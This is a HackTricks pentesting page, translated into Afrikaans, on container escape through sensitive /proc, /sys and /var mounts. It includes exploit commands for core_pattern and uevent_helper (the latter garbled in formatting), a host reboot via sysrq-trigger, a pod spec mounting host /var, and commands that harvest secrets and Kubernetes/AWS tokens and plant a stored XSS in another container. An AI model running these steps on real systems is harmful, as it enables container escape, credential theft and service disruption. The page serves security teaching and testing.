# Sensitiewe Monte

{{#include ../../../../banners/hacktricks-training.md}}

Die blootstelling van `/proc`, `/sys`, en `/var` sonder behoorlike naamruimte-isolasie stel beduidende sekuriteitsrisiko's in, insluitend die vergroting van die aanvaloppervlak en inligtingsontsluiting. Hierdie gidse bevat sensitiewe lêers wat, indien verkeerd geconfigureer of deur 'n nie-geautoriseerde gebruiker toegang verkry, kan lei tot houerontvlugting, gasheerwysiging, of inligting kan verskaf wat verdere aanvalle ondersteun. Byvoorbeeld, om `-v /proc:/host/proc` verkeerd te monteer kan AppArmor-beskerming omseil weens sy pad-gebaseerde aard, wat `/host/proc` onbeskermd laat.

**Jy kan verdere besonderhede van elke potensiële kwesbaarheid vind in** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## procfs Kwesbaarhede

### `/proc/sys`

Hierdie gids laat toegang toe om kernvariabeles te wysig, gewoonlik via `sysctl(2)`, en bevat verskeie subgidse van bekommernis:

#### **`/proc/sys/kernel/core_pattern`**

- Beskryf in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Laat toe om 'n program te definieer wat uitgevoer moet word op kernlêer-generasie met die eerste 128 bytes as argumente. Dit kan lei tot kode-uitvoering as die lêer met 'n pyp `|` begin.
- **Toets en Exploit Voorbeeld**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Toets skrywe toegang
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Stel pasgemaakte handler in
sleep 5 && ./crash & # Trigger handler
```

#### **`/proc/sys/kernel/modprobe`**

- Gedetailleerd in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Bevat die pad na die kernmodule-laaier, wat aangeroep word om kernmodules te laai.
- **Kontroleer Toegang Voorbeeld**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Kontroleer toegang tot modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- Verwys na [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- 'n Globale vlag wat beheer of die kern paniek of die OOM-killer aanroep wanneer 'n OOM-toestand voorkom.

#### **`/proc/sys/fs`**

- Volgens [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), bevat opsies en inligting oor die lêerstelsel.
- Skrywe toegang kan verskeie ontkenning van diens-aanvalle teen die gasheer moontlik maak.

#### **`/proc/sys/fs/binfmt_misc`**

- Laat toe om interpreteerders vir nie-inheemse binêre formate te registreer gebaseer op hul magiese nommer.
- Kan lei tot voorregverhoging of wortel-sheltoegang as `/proc/sys/fs/binfmt_misc/register` skryfbaar is.
- Betrokke exploit en verduideliking:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Diepgaande tutoriaal: [Video skakel](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Ander in `/proc`

#### **`/proc/config.gz`**

- Mag die kernkonfigurasie onthul as `CONFIG_IKCONFIG_PROC` geaktiveer is.
- Nuttig vir aanvallers om kwesbaarhede in die lopende kern te identifiseer.

#### **`/proc/sysrq-trigger`**

- Laat toe om Sysrq-opdragte aan te roep, wat moontlik onmiddellike stelselhervattings of ander kritieke aksies kan veroorsaak.
- **Hervatting van Gasheer Voorbeeld**:

```bash
echo b > /proc/sysrq-trigger # Hervat die gasheer
```

#### **`/proc/kmsg`**

- Blootstel kernringbufferboodskappe.
- Kan help in kern exploits, adreslekas, en sensitiewe stelselinligting verskaf.

#### **`/proc/kallsyms`**

- Lys kern-eksporteerde simbole en hul adresse.
- Essensieel vir kern exploit ontwikkeling, veral om KASLR te oorkom.
- Adresinligting is beperk met `kptr_restrict` op `1` of `2` gestel.
- Besonderhede in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Interfereer met die kern geheue toestel `/dev/mem`.
- Histories kwesbaar vir voorregverhoging aanvalle.
- Meer oor [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Verteenwoordig die stelsels fisiese geheue in ELF kernformaat.
- Lees kan die gasheerstelsel en ander houers se geheue-inhoud lek.
- Groot lêergrootte kan lei tot leesprobleme of sagtewarekrake.
- Gedetailleerde gebruik in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Alternatiewe interfase vir `/dev/kmem`, wat kern virtuele geheue verteenwoordig.
- Laat lees en skryf toe, dus direkte wysiging van kern geheue.

#### **`/proc/mem`**

- Alternatiewe interfase vir `/dev/mem`, wat fisiese geheue verteenwoordig.
- Laat lees en skryf toe, wysiging van alle geheue vereis om virtuele na fisiese adresse op te los.

#### **`/proc/sched_debug`**

- Gee proses skedulering inligting terug, wat PID naamruimte beskermings omseil.
- Blootstel prosesname, ID's, en cgroup identifiseerders.

#### **`/proc/[pid]/mountinfo`**

- Verskaf inligting oor monteerpunte in die proses se monteernaamruimte.
- Blootstel die ligging van die houer `rootfs` of beeld.

### `/sys` Kwesbaarhede

#### **`/sys/kernel/uevent_helper`**

- Gebruik vir die hantering van kern toestel `uevents`.
- Skryf na `/sys/kernel/uevent_helper` kan arbitrêre skripte uitvoer wanneer `uevent` triggers plaasvind.
- **Voorbeeld vir Exploit**: %%%bash

#### Skep 'n payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Vind gasheer pad van OverlayFS monteer vir houer

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Stel uevent_helper in op kwaadwillige helper

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Trigger 'n uevent

echo change > /sys/class/mem/null/uevent

#### Lees die uitvoer

cat /output %%%

#### **`/sys/class/thermal`**

- Beheer temperatuurinstellings, wat moontlik DoS-aanvalle of fisiese skade kan veroorsaak.

#### **`/sys/kernel/vmcoreinfo`**

- Lek kern adresse, wat moontlik KASLR in gevaar kan stel.

#### **`/sys/kernel/security`**

- Huisves `securityfs` interfase, wat konfigurasie van Linux Sekuriteitsmodules soos AppArmor toelaat.
- Toegang mag 'n houer in staat stel om sy MAC-stelsel te deaktiveer.

#### **`/sys/firmware/efi/vars` en `/sys/firmware/efi/efivars`**

- Blootstel interfaces vir interaksie met EFI veranderlikes in NVRAM.
- Misconfigurasie of eksploit kan lei tot gebroke skootrekenaars of onbootbare gasheer masjiene.

#### **`/sys/kernel/debug`**

- `debugfs` bied 'n "geen reëls" debugging interfase aan die kern.
- Geskiedenis van sekuriteitskwessies weens sy onbeperkte aard.

### `/var` Kwesbaarhede

Die gasheer se **/var** gids bevat houer runtime sokke en die houers se lêerstelsels. As hierdie gids binne 'n houer gemonteer word, sal daardie houer lees-skrif toegang tot ander houers se lêerstelsels met wortel voorregte kry. Dit kan misbruik word om tussen houers te pivot, om 'n ontkenning van diens te veroorsaak, of om ander houers en toepassings wat daarin loop te backdoor.

#### Kubernetes

As 'n houer soos hierdie met Kubernetes ontplooi word:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: pod-mounts-var
labels:
app: pentest
spec:
containers:
- name: pod-mounts-var-folder
image: alpine
volumeMounts:
- mountPath: /host-var
name: noderoot
command: [ "/bin/sh", "-c", "--" ]
args: [ "while true; do sleep 30; done;" ]
volumes:
- name: noderoot
hostPath:
path: /var
```
Binne die **pod-mounts-var-folder** houer:
```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
are/nginx/html/index2.html
```
Die XSS is bereik:

![Gestoorde XSS via gemonteerde /var-gids](/images/stored-xss-via-mounted-var-folder.png)

Let daarop dat die houer NIE 'n herstart of iets benodig nie. Enige veranderinge wat via die gemonteerde **/var**-gids gemaak word, sal onmiddellik toegepas word.

Jy kan ook konfigurasie lêers, binêre lêers, dienste, toepassingslêers en skulpprofiele vervang om outomatiese (of semi-outomatiese) RCE te bereik.

##### Toegang tot wolkakkredite

Die houer kan K8s diensrekening tokens of AWS webidentiteit tokens lees wat die houer in staat stel om ongemagtigde toegang tot K8s of die wolk te verkry:
```bash
/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
<SNIP>
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
```
#### Docker

Die uitbuiting in Docker (of in Docker Compose ontplooiings) is presies dieselfde, behalwe dat die ander houer se lêerstelsels gewoonlik beskikbaar is onder 'n ander basispad:
```bash
$ docker info | grep -i 'docker root\|storage driver'
Storage Driver: overlay2
Docker Root Dir: /var/lib/docker
```
So die lêerstelsels is onder `/var/lib/docker/overlay2/`:
```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
<SNIP>
```
#### Nota

Die werklike paaie mag verskil in verskillende opstellings, wat is waarom jou beste kans is om die **find** opdrag te gebruik om die ander houers se lêerstelsels en SA / web identiteitstokens te lokaliseer.

### Verwysings

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
